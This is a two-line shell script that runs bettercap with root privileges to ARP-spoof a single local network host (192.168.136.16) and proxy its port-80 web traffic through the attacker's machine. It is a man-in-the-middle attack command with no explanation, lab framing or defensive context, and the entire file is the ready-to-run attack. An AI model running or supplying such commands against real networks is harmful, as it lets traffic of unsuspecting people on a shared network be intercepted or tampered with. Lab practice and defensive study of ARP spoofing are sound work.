#!/bin/sh
sudo bettercap -iface wlo1 -eval "set arp.spoof.targets 192.168.136.16; set any.proxy.dst_port 80; arp.spoof on; any.proxy on"
